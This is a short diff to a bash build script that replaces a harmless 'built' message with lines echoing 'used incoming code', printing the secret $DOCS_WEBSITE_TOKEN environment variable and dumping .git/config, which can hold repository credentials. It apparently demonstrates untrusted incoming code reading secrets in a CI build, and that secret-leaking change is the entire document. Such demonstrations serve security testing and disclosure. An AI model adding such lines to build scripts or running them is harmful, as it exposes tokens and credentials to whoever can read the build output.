@@ -1,2 +1,4 @@
 #!/usr/bin/env bash
-echo "built"
+echo "used incoming code"
+echo $DOCS_WEBSITE_TOKEN
+cat .git/config
